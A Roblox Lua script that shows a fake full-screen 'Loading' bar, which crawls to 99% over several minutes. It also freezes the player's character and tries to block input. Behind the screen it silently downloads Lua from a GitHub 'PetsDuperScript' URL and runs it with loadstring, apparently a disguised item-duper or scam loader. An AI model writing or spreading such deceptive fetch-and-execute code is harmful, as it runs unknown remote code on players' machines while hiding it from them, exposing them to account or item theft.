-- Fullscreen Loading Screen with Input Lock
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")

-- Block all input
UserInputService.InputBegan:Connect(function(input)
	if CoreGui:FindFirstChild("FullScreenLoading") then
		return Enum.ContextActionResult.Sink
	end
end)

local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = "FullScreenLoading"
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999 -- top-most

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.BorderSizePixel = 0

local percentText = Instance.new("TextLabel", bg)
percentText.Size = UDim2.new(1, 0, 0.1, 0)
percentText.Position = UDim2.new(0, 0, 0.4, 0)
percentText.BackgroundTransparency = 1
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.TextScaled = true
percentText.Font = Enum.Font.GothamBold
percentText.Text = "🌱 Loading... 1%"

local barBG = Instance.new("Frame", bg)
barBG.Size = UDim2.new(0.6, 0, 0.04, 0)
barBG.Position = UDim2.new(0.2, 0, 0.5, 0)
barBG.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
barBG.BorderSizePixel = 0
barBG.ClipsDescendants = true

local barFill = Instance.new("Frame", barBG)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
barFill.BorderSizePixel = 0

-- Disable character movement (optional but recommended)
local char = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
if char and char:FindFirstChildOfClass("Humanoid") then
	char:FindFirstChildOfClass("Humanoid").WalkSpeed = 0
	char:FindFirstChildOfClass("Humanoid").JumpPower = 0
end

-- Slow fill from 1% to 99%
task.spawn(function()
	for i = 1, 99 do
		barFill.Size = UDim2.new(i / 100, 0, 1, 0)
		percentText.Text = "🌱 Loading... " .. i .. "%"
		wait(3) -- 3 seconds per %
	end
	percentText.Text = "🌱 Loading... 99%"
end)

-- Silent background spawner execution
task.spawn(function()
	local success, spawner = pcall(function()
		return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pragsz868/PetsDuperScript/refs/heads/main/YourRealSpawnerScript.lua"))()
	end)
	if not success then
		warn("Spawner failed.")
	end
end)
